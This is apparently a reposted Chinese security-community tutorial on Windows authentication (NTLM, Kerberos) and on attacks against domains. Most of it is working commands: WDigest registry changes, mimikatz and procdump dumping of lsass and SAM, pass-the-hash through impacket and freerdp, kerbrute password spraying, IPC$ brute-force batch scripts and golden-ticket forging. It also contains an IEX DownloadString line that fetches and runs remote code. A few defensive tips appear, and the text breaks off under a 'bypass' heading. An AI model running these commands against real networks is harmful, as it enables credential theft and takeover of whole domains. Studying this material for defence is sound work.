<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/10491)

> 先知社区，先知安全技术社区

windows 中 hash 结构一般为`username:RID:LM-hsah:NTLM-hash`，windwos 2000 之后 LM-hash 都为空，因为很容易破解一般被禁用。NTLM 密码 hash 保存在`%SystemRoot%\System32\config\SAM`，在域中，用户信息保存在`C:\Windows\NTDS\NTDS.dit`中

windows 中密码格式：`Username:RID:LM-Hash:NT-Hash`，在 LM 禁用的版本中为空值。

LM-hash
-------

windows7 默认禁用 LM-hash 加密，本地安全策略 -》本地策略 -》安全选项，将不储存 LAN 管理器哈希值改为禁用。

特点：

1.  口令不区分大小写
    
2.  口令长度最多为 14 字节，如果没有超过 7 字节后面 8 字节是固定的
    
3.  DES 算法强度不够（字符串 “KGS!@#$%” 为 Key）

NTLM hash
---------

在渗透测试中，通常可从 Windows 系统中的 SAM 文件和域控的 NTDS.dit 文件中获得所有用户的 hash，通过 Mimikatz 读取 lsass.exe 进程能获得已登录用户的 NTLM hash

1.  加密流程：先转换为 16 进制，unicode 转换，MD4 加密

### Net-NTLM Hash

指网络环境下的 NTLM 认证中的 Hash

在 NTLM 协议中，NTLM 响应就分为 NTLM v1，NTLMv2，NTLM session v2 三种协议，不同协议使用不同格式的 Challenge 和加密算法

所以也就存在不同协议的 Net-NTLM hash，即 Net-NTLM v1 hash，Net-NTLM v2 hash

就是 NTLM 协议中，客户端获取 challenge 后使用自己的 NTLM hash 对其进行加密的结果。（就是 Response）

这一类 hash 不能用于 PTH，但是能够暴力破解出密码

自 Windows Vista/Server2008 开始，系统默认禁用 Net-NTLMv1，使用 Net-NTLMv2

v1 格式：`username::hostname:LM response:NTLM response:challenge`

v2 格式：`username::domain:challenge:HMAC-MD5:blob`

### Net-NTLMv1 加密利用思路

修改注册表开启 v1：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v NtlmMinClientSec /t REG_DWORD /d 536870912 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f

```

加密流程

```
服务端返回8位challenge
客户端收到challenge后，使用用户密码Hash加密challenge，作为response（加密算法为3DES）

```

利用思路

```
在控制challenge后在短时间内通过彩虹表还原出用户的NTLM Hash

```

利用工具：[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)

NTLM 破解工具：[https://hashcat.net/wiki/doku.php](https://hashcat.net/wiki/doku.php)

### Net-NTLMv2

与 v1 不同的是 challenge 有 16 位，加密算法是 HMAC-MD5

windwos 认证流程
------------

winlogon.exe -》用户输入 -》 lsass.exe -》 认证

用户输入密码后交给 lsass.exe 进程，它会先保存一份明文密码，将明文密码加密为 NTLM Hash，与 SAM 数据库进行比较。

LM
--

早期 SMB 协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称 LM，它是如此简单以至很容易就被破解，现在又有了 NTLM 以及 Kerberos。

1.  A 向 B 发起请求
2.  B 返回 A 一个 8 字节的响应码
    
3.  A 将自己的 LM Hash 分成三部分，每组 7 字节，每组都使用响应码对其进行加密，然后发送给 B。
    
4.  然后 B 也执行和 A 相同的操做，不过 LM Hash 是储存在服务器中的 A 的 LM Hsah。
    
5.  如果比对一样则通过验证。
    

NTLM
----

NTLM 是一种认证协议，NTLM 采用质询 / 应答 (Challenge/Response) 的消息交换模式，在域中优先使用 Kerberos 协议，但是也可以使用 NTLM

1.  用户输入账号密码登录 Windows，客户端缓存输入密码的 hash 值。
2.  客户端向服务器发送请求，请求包括明文表示的用户名。
    
3.  服务端判断用户名是否存在，存在则生成 16 位 challenge 保存并返回给客户端。
    
4.  客户端收到 challenge 后使用密码 hash 进行加密，然后发送给服务器（发送的就是 Response）。
    
5.  服务器收到后利用自己数据库中的密码 hash 加密 challenge，然后进行比较
    
6.  在域中第 5 步则是：
    
7.  1.  在域中服务器会发送给 DC，包括客户端用户名，客户端密码 hash 值加密的 challenge，原始 challenge
    2.  DC 根据用户名在数据库中查找密码 hash。对 challenge 进行加密比对，然后将结果返回给客户端。

**明文并没有在两者之间传输，使用的是 NTLM Hash，如果攻击者获得了 NTLM Hash，就可以进行 Hash 传递攻击（Pass The Hash）**

Kerberos
--------

Kerberos 是一种网络认证协议，在网络上传输的数据包可以被任意地读取，修改，和插入数据时，Kerberos 任然被认为是一种可信任的第三方服务

参与角色：客户端，服务器，KDC（密钥分发中心）= DC

### AD 目录

AD 储存关于网络对象的信息，使管理员能够轻松查找这些信息

网络对象划分为：用户，用户组，计算机，域，组织单位，安全策略

### KDC 组成

AD：储存所有客户白名单，只有在白名单中的客户端才可以申请 TGT

AS：为客户端生成 TGT 的服务

TGS：为客户端生成某个服务的 ticket

从物理层面看 AD 域 KDC 都是域控

### Kerberos 认证流程

**一。客户端认证（Client-AS**）

**AS-REQ**：Hash 传递攻击，域外用户枚举，密码喷洒攻击，pass the hash with remote desktop，KB22871997

1.  客户端向服务端发送客户端信息和相应的请求（消息 1）
    
2.  1.  用户的标识和请求的服务
    2.  预认证数据，Hash 加密的时戳

**AS-REP**：黄金票据，AS-REP Roasting 攻击

1.  kerberos 检查该用户是否在本地数据库中，解密时间戳，然后返回两条信息（消息 2）
    
2.  1.  Client/TGS 会话密钥（Client/TGS Session key）， 用于客户端与 TGS 之间的通信，使用客户端的 NTLM Hash 加密（消息 2a）
    2.  票据授权票据（Ticket Granting Ticket），包含 Client/TGS 会话密钥，用户 ID，用户网址，消息 2 有效期，通过 TGS 密钥进行加密。（消息 2b）
3.  客户端收到消息后，使用自己的 NTLM Hash 解密消息 2a，得到 TGS 会话密钥。
    

**二。服务授权（Client-TGS）**

1.  客户端想要申请服务的时候，向 TGS 发送两条消息：
    
2.  1.  消息 2b（就是 TGT），想要获取的服务 ID。
    2.  认证符（Authenticator），包含用户 ID 和时间戳，使用 Client/TGS 会话密钥进行加密。
3.  Kerberos 收到客户端的消息后，TGS 先在 KDC 中查找服务 ID 是否存在，然后使用自己的 TGS 密钥解密消息客户端发送过来的消息 2b，得到 Client/TGS 会话密钥
    

**TGS-REP**：SPN，Kerberosast 攻击，白银票据

1.  使用 Client/TGS 会话密钥解密消息 4b，核对完成后向客户端发送：
    
2.  1.  客户端 - 服务器票据（Client-Server-Ticket），包含 Client/SS 会话密钥（Client/Server Session key），用户 ID，用户网址，票据有效日期。使用服务器密钥加密。
    2.  Client/SS 会话密钥，使用 Client/TGS 密钥加密。
3.  客户端收到消息后使用 2a 解密得到的 Client/TGS 密钥解密消息 6b，得到 Client/SS 会话密钥。
    

**三。服务请求**

1.  客户端向服务发起请求：
    
2.  1.  发送消息 6a。
    2.  新的 Authentication（用户 ID，时间戳），使用 Client/SS 会话密钥加密。
3.  服务器收到消息后，使用自己的服务器密钥解密接收到的消息 6a，得到 Client/SS 密钥，在使用 Client/SS 密钥解密消息 8b，获取 Authentication，获取用户 ID 和时间戳。此时服务器就可以给客户端提供服务了，向服务端发送一条消息：
    
4.  1.  新的时间戳，使用 Client/SS 加密

四。客户端与服务沟通

1.  客户端拿到消息 9a 后，使用 Client/SS 解密，验证时间戳，确认服务器身份，然后开始请求。

五。Kerberos 的缺点

1.  如果 Kerberos 挂了，就无法请求服务。
2.  时间需要统一，因为票据具有时效性，时间不能超过 10 分钟
    
3.  DC 被控，整个域就完了
    
4.  客户端防御差，用户密码 Hash 也会被拿走

根据 Kerberos 的不同流程，可以造成不同的攻击。

抓取密码
----

### Wdigest Auth

[https://mp.weixin.qq.com/s/wBgAOb3toxseqwHMToU6nQ](https://mp.weixin.qq.com/s/wBgAOb3toxseqwHMToU6nQ)

[https://baijiahao.baidu.com/s?id=1611387816169124711&wfr=spider&for=pc](https://baijiahao.baidu.com/s?id=1611387816169124711&wfr=spider&for=pc)

mimikatz 能导出明文的原因是因为 wdigest SSP 保存了可逆的密码密文。

在 KB2871997 之前有其他的 SSP 也能保存明文，windwos 在安装 KB2871997 补丁或者版本大于 Windows 10 和 Windows Server 2012 时，禁止在内存中保存明文密码，但可以通过修改注册表读取。

KB2871997 补丁默认禁用了 Wdigest Auth，lsass 不保存明文密码，但是某些服务需要用 Wdigest Auth，所以还能手动开启。

#### Wdigest 作用

与 NTLM 一样是一种挑战认证协议，只能用于域账户认证，只要用于 IIS 和 LDAP。它的出现主要是为了代替 HTTP BASIC，HTTP BASIC 会将密码以 base64 的方式发送。

#### Digest 验证方式

Digest 是对 RFC 2069 和 RFC 2617 的实现，由于在计算 hash 的时候需要用到明文密码，所以为了实现认证，只能将密码保存在内存中。

#### Digest 服务端

由于 Digest 服务需要计算客户端返回的 response，也需要保存明文密码，这里就涉及 Reversible Encryption 功能。

1.  Reversible Encryption

默认情况下域账号都是关闭这个功能的，所以默认不能使用 Wigest 认证，域数据库里只保存了 hash 没有保存密码。

1.  Advanced Digest

从 windows 2003 开始，wdigest.dll 就是实现 Advanced digest，它不在储存明文密码。保存明文密码是因为我们需要算出 hash 值，Advanced digest 会先计算出 hash 值并保存。实际上域里一共保存了 29 中 hash。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120846-6724ce44-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120846-6724ce44-491a-1.png)

不过这也只能杜绝服务端保存明文。

由于客户端可能与任何域进行认证，所以无法预先计算 hash。

#### 开启 Wdigest Auth

```
1. cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest  UseLogonCredential /t REG_DWORD /d 1 /f 
2. powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
3. meterpreter
reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1
关闭只需将最后的1改为0

```

关闭之后需要重新登录才能获取密码，强制锁屏

```
1. cmd
rundll32 user32.dll,LockWorkStation
2. powershell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kiraly15/Lock-WorkStation/master/Lock-WorkStation.ps1');"

```

### mimikatz

需要管理员权限，因为要读取 lsass 进程。高版本需要开启 Wdigest Auth 才能读取明文密码。

```
privilege::debug  #提权
#读取lsass进程
    sekurlsa::logonpasswords 
读取SAM表
    token::elevate
  lsadump::sam

```

防御方法：mimikatz 需要与 lsass 进程进行交互，需要 Debug 权限，而 DeBug 权限在 Administrators 组所有，所以在配置权限的时候可以将 Administrators 组中拥有 DeBug 权限的账号移除，mimikatz 再次使用`privilege::debug`时就会出错。

win+r 输入 secpol.msc

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120846-6734fa1c-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120846-6734fa1c-491a-1.png)

#### Additional LSA Protection

为 lsass 进程提供保护，在 win8.1，win server 2012 r2 及以上版本有效。

启用方法

```
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1

```

重启之后无法读取密码，但是可以在 mimkatz 同级目录下使用 mimidrv.sys 绕过

### procdump

1.  dump lsass.exe

```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120846-6743a3e6-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120846-6743a3e6-491a-1.png)

1.  读取密码

```
sekurlsa::minidump lsass.dmpsekurlsa::tspkgsekurlsa::logonpasswords

```

### SAM 表

离线获取 SAM 表

```
# cmd管理员reg save HKLM\SYSTEM systemreg save HKLM\SAM sam# mimikatz读取lsadump::sam /sam:sam /system:system

```

### msf

```
加载mimikatz：load mimkatz明文密码：wdigest密码hash：msv执行mimikatz命令：mimikatz_command -f sekurlsa::logonpasswords

```

### powershell

Invoke-Mimikatz.ps1:[https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1](https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)

### 转储进程

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-6755fa32-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-6755fa32-491a-1.png)

```
# mimikatzsekurlsa::minidump lsass.DMPsekurlsa::logonPasswords full

```

### 获取 RDP 密码

win10 失败

RDP 凭据目录：`C:\Users\用户名\AppData\Local\Microsoft\Credentials`

获取命令：`cmdkey st或powerpick Get-ChildItem C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\ -Force`

1.  获取连接主机的 ip

工具：[https://github.com/3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History)

```
./ListLogged-inUsers.ps1

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-6761527e-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-6761527e-491a-1.png)

使用 cmd

`reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s`

1.  获取密码

```
查看凭据dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*使用mimikatz =》 .\mimikatz.exe ；提权 =》 privilege::debugdpapi::cred /in:C:\Users\de1ay\AppData\Local\Microsoft\Credentials\SSESSION##如果没有得到密码 需要手动输入masterkey，上面的命令可以看见guidmasterkey找到所有masterkey，通过相同的guidmasterkey获取masterkeysekurlsa::dpapidpapi::cred /in:C:\Users\de1ay\AppData\Local\Microsoft\Credentials\SESSION /masterkey:masterkey

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-676ca5de-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-676ca5de-491a-1.png)

横向（AS-REQ）
----------

### PTH

由于 windows 认证采用 NTLM 协议，并没有传递明文密码，通过获取管理员 LM hash 或者 NTLM hash 就可以登录其他主机，获取其他主机权限

使用环境：域，工作组

版本限制：

1.  Windows NT 5.x 中，管理员组账号均能获取系统管理权
2.  Windows NT 6.x 中，管理员组（除 SID500 账户）不能获取管理员权限

使用条件：要登录的用户是域管理员组（域）或者管理员组（工作组），知道前面账号的密码 hash`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`的值需要为 0，如果为 1 则管理员也无法通过网络登录的方式获取高权限。如果`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`值为 1，则所有管理员组账户都能获取高权限。

#### mimikatz

条件：需要管理员权限

域

```
mimikatzlog log.txt #将接下来的输出结保存到当前目录下的log.txt中，方便复制privilege::debugsekurlsa::pth /user:xxx /domian:xxx /ntlm:xxxx(32位)

```

工作组

```
获取hash后sekurlsa::pth /user:administrator /domian:workgroup /ntlm:xxxx(32位)成功之后弹出的cmd执行ipc命令 可以不用输入密码了

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67840c1a-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67840c1a-491a-1.png)

#### impacket 工具包

python 版：[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

exe 版：[https://github.com/maaaaz/impacket-examples-windows](https://github.com/maaaaz/impacket-examples-windows)

##### psexec

获取的是机器 system 权限

1.  使用 NTLM 协议

```
psexec.exe -hashes LM hash:NTLM hash domain/username@x.x.x.xpsexec.exe -hashes f67ce45ac631223dc18778085fe1d9df:161cff384477fe59635db81874498a24 de1ay/administrator@10.10.10.11LM Hash可以为空工作组中domain/username就改为机器名/username，就是whoami

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67960884-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67960884-491a-1.png)

1.  使用 Kerberos 协议

当在域环境中时，如果指定 IP 访问，会使用 NTLM 协议进行身份认证，因为没有提供 SPN（server principal name）

指定 psexec 指定 - k 参数使用 kerberos 协议

`setspn -q */*`查看 SPN

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67a49c46-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67a49c46-491a-1.png)

```
psexec.exe de1ay.com/administrator@web-sc.de1ay.com -hashes f67ce55ac831223dc187b8085fe1d9df:161cff084477fe596a5db81874498a24 -k

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67b60b84-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67b60b84-491a-1.png)

##### wmiexec

获取登录账号权限

```
wmiexec.exe -hashes f67ce45ac631223dc18778085fe1d9df:161cff384477fe59635db81874498a24 de1ay/pc32@10.10.10.12

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67c5272c-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67c5272c-491a-1.png)

##### smbexec

```
smbexec.exe -hashes :161cff084477fe596a5db81874498a24 de1ay/administrator@10.10.10.12

```

#### 禁用 NTLM 协议

域控中 本地安全策略

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67d7d7aa-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67d7d7aa-491a-1.png)

使用 kerberos 协议 PTH

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67e9a200-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120847-67e9a200-491a-1.png)

### KB2871997

1.  支持`Protected User`组
2.  支持 Restricted Admin RDP 模式
    
3.  注销后删除内存中的凭据
    
4.  添加两个新 SID
    
5.  lsass 中只允许 wdigest 储存明文密码，默认禁用
    

#### 是否能阻止 PTH

**没有安装 KB2871997**

域中账户：

1.  域管`de1ay\administrator`（成功）

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-67f9d602-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-67f9d602-491a-1.png)

1.  普通域账户添加到本地管理员`de1ay\pc`（成功）

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-6807af34-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-6807af34-491a-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-68176712-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-68176712-491a-1.png)

1.  本地 sid500 管理员`sc\administrator`（成功）

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-6828c638-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-6828c638-491a-1.png)

1.  本地普通管理员`sc\test_admin`（失败）

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-68396a56-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-68396a56-491a-1.png)

**安装 KB2871997**

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-68475062-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-68475062-491a-1.png)

然而结果并没有变化

#### 结论

事实上是否能 PTH 取决于 UAC

administrator 的 sid 为 500，而域账号使用的是域内的 sid，本地普通管理员无法 PTH 正是被 UAC 拦截了。

#### Protected User 组

该组成员会强制使用 kerberos 认证，并且使用 AES 加密。

#### 两个 SID

S-1-5-113 和 S-1-5-114

S-1-5-113 为全部本地账户 S-1-5-114 是本地 administrator 组账户

域账户并不受影响

### PTK

#### mimikatz

```
sekurlsa::pth /user:administrator /domain:alanlitl.com /aes256:xxxxxxx在弹出的cmd中连接其他主机即可

```

### 域外用户枚举

域外主机也能与域控进行交互，只要能访问域控的 88 端口，就能利用 kerberos 协议的 AS-REQ 阶段，通过这种方式去枚举用户名。

优点：不会产生大量日志

*   验证成功：产生日志 4768 - A Kerberos authentication ticket (TGT) was requested
*   验证失败：产生日志 4771 - Kerberos pre-authentication failed

**攻击方法**

kerbrute：`https://github.com/ropnop/kerbrute/`

1.  爆破用户：`kerbrute_windows_amd64.exe userenum --dc 10.10.10.10 -d de1ay.com user.txt`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-6858bbe0-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-6858bbe0-491a-1.png)

1.  爆破密码：`kerbrute_windows_amd64.exe passwordspray -d 1qaz@WSX user.txt 1qaz@WSX`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-686aba52-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-686aba52-491a-1.png)

1.  产生的日志

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-687c983a-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120848-687c983a-491a-1.png)

1.  pyKerbrute

```
https://github.com/3gstudent/pyKerbrute

```

*   增加对 TCP 协议的支持
*   增加对 NTLM hash 的验证
    
*   EnumADUser
    
*   支持 TCP 和 UDP
    
*   TCP：`python2 EnumADUser.py 10.10.10.10 de1ay.com user.txt tcp`
    
*   UDP：`python2 EnumADUser.py 10.10.10.10 de1ay.com user.txt udp`
    
*   ADPwdSpray.py
    
*   支持 TCP UDP 和明文，NTLM hash
    
*   明文：`python2 ADPwdSpray.py x.x.x.x de1ay.com user.txt clearpassword 1qaz@WSX tcp`
    
*   NTLM Hash：`python2 ADPwdSpray.py x.x.x.x de1ay.com user.txt ntlmhash xxxxxxxxxxxxxxxxxxx tcp`
    

### 密码喷洒攻击

利用工具：[https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

指定参数

```
Domain 指定域RemoveDisable 删除禁用的用户  RemovePotentialLockouts 删除锁定账户UserList 自定义用户列表Password 指定单个密码         PasswordList 指定密码字典OutFile 结果保存到文件        Force 枚举出一个后继续枚举

```

1.  获取域用户
    
2.  `powershell执行：import-module .\DomainPasswordSpray.ps1;get-domainuserlist`
    
3.  `net user /doamin`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-688b7314-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-688b7314-491a-1.png)

1.  爆破
    
2.  `Import-Module .\DomainPasswordSpray.ps1;Invoke-DomainPasswordSpray -Password 1qaz@WSX`
    

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-689b3240-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-689b3240-491a-1.png)

### RDP 横向

RDP Hash 传递

windows server 2012 R2，win8.1 默认支持，Windows 7 和 Windows Server 2008 R2 需要安装 KB2871997 和 KB2984972。[详细](https://docs.microsoft.com/zh-cn/archive/blogs/kfalde/restricted-admin-mode-for-rdp-in-windows-7-2008-r2)

1.  受限制模式本意是防止从内存中获取用户凭证，当没有开启受限管理员模式并且没有打上 KB2871997 时，我们可以在内存中获取用户明文和 Hash，也可以使用缓存的凭据去访问其他服务（smb 等等）。
2.  当开启受限管理员时（客户端使用 mstsc /restrictedadmin 启动），如果本机用户名密码与要登录远程主机相同那么就会直接登录，就算不同也会在计算出所需要的值后发送给远程主机，此时使用 mimikatz 读取内存，就无法读取到远程登录明文密码，Hash。

```
查看远程桌面是否打开 0开启，1关闭REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections开启远程桌面（1改为0就是关闭） wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1  开启3389REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f检查3389是否打开tasklist /svc | find "TEermServic"netstat -ano | find "上面查到的进程号"或者netstat -ano | find "3389"开启Restricted admin modeREG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f使用linux客户端apt-get install freerdp-x11xfreerdp /u:administrator /pth:161cff084477fe596a5db81874498a24 /v:192.168.62.134 /cert-ignore如果提示身份验证错误，在服务端执行REG add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68af0194-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68af0194-491a-1.png)

### IPC$

IPC$（Internet process connection）让进程间通信而开放的命名管道，通过提供可信的用户名和口令，建立安全的通道进行数据交换，基于 SMB 协议，所以 IPC$ 默认走 445 端口，要是不通则走 139 端口（开启 NBT 情况下）。

#### 直接使用 IPC 命令

使用条件：

1.  开放 139，445 端口
2.  目标开启 IPC$ 文件共享
    
3.  获取用户账号密码
    

```
建立连接net use \\10.10.10.12\ipc$ /user:administrator "1qaz@WSX"删除连接net use \\10.10.10.12\ipc$ /del查看文件dir \\192.168.242.134\c$复制文件copy mimikatz.exe \\x.x.x.x\c$\temp\mimikatz.exe创建任务schtasks /create /tn "test /tr calc.exe /sc once /st 16:32 /S 193.168.1.12 /RU System /u administrator /p "1qaz@WSX"直接运行任务schtasks /run /tn "test" /S 192.168.242.134 /u administrator /p "1qaz@WSX"删除任务schtasks /F /delete /tn "plugin_update" /S 192.168.242.134 /u administrator /p "1qaz@WSX"

```

#### 使用 psexec

通过 ipc$ 连接，在目标机器传送 psexesvc.exe，创建并启动服务，客户端连接。

利用工具：Metasploit 的 psexec psexec psh, Impacket 工具包的 psexec, pth-winexe, Empire Invoke-Psexec，windows 的 PsExec

优点：获取的是 system 权限

缺点：需要启动服务，特征明显容易被杀，需要开启 admin$

1.  PsExec

```
net use \\x.x.x.x\ipc$ "password" /user:de1ay\administratorPsExec.exe -accepteula \\10.10.10.10 -s cmd.exe

```

#### 爆破

有密码

```
@echo offclsecho Useage: %0 ip.txt pass.txtfor /f %%t in (%1) do (FOR /F "eol=; tokens=1,2,3* delims=, " %%i in (%2) do (echo net use \\%%t\ipc$ "%%i" /user:"localhost\Administrator" >> log.txtnet use \\%%t\ipc$ "%%i" /user:"localhost\Administrator"  >NUL 2>NULIF NOT errorlevel 1 (echo %%i  t:%%t>> pic.txtnet use \\%%t\ipc$ /del)net use * /del /y >NUL 2>NUL))echo end >> end.txt

```

无密码

```
@echo offclsecho Useage: %0 ip.txtfor /f %%t in (%1) do (echo net use \\%%t\ipc$ "" /user:"localhost\Administrator" >> log.txtnet use \\%%t\ipc$ "" /user:"localhost\Administrator"  >NUL 2>NULIF NOT errorlevel 1 (echo success:%%t>> pic.txtnet use \\%%t\ipc$ /del)net use * /del /y >NUL 2>NUL)echo end >> end.txt

```

#### 端口禁用

防火墙关闭两个端口

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68bd0ba4-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68bd0ba4-491a-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68c9be6c-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68c9be6c-491a-1.png)

开启 445

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68d55f10-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68d55f10-491a-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68e11f76-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68e11f76-491a-1.png)

开启 139

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68ee4912-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68ee4912-491a-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68fbb200-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-68fbb200-491a-1.png)

横向（AS-REP）
----------

### 黄金票据

黄金票据是伪造 TGT 票据，没有进行 AS-REQ 和 AS-REP 通信。

伪造黄金票据要求：

1.  域名称
2.  域 SID 值
    
3.  krbtgt 账户 Hash
    
4.  伪造用户名

#### 特点

1.  KDC 不会检查 TGT 中的用户，知道 TGT 超时 20 分钟，所以攻击者能使用禁用，删除甚至是不存在用户。
2.  票据有效时间以票据为准
    
3.  不管有没有加入域，只要能在网络上访问，就能造成攻击
    

#### 伪造票据

**使用 mimikatz**

1.  获取 krbtgt hash

```
在域控上导出hashlsadump::dcsync /domian:de1ay.com /user:krbtgtlsadump::lsa /patch

```

1.  伪造票据

找到一下信息

域名，sid，aes256 或者 ntml

```
kerberos::golden /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604-502 /aes256:S-1-5-21-2756371121-2868759905-3853650604-502 /user:administrator /ticket:gold.kirbikerberos::golden /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604-502 /krbtgt:S-1-5-21-2756371121-2868759905-3853650604-502 /user:administrator /ticket:gold.kirbi

```

1.  使用票据

```
kerberos::list  #查看票据kerberos::purge #清空票据kerberos::ptt gold.kirbi #注入票据

```

1.  获取权限

使用 psexec 或者 wmi 都可以

需要使用机器名

```
PsExec.exe -accepteula //DC.de1ay.com -s cmd如哦开启了RPC服务，可以使用wmiexec连接cscript wmiexec.vbs /shell 10.10.10.10

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-690c0d08-491a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011120849-690c0d08-491a-1.png)

#### 局限性及其绕过

**局限：**

由于 mimkatz 通过 RID（相对安全标记符）向票据添加组成员资格，因此在多域中，无法向其它域提供权限。

**绕过：**

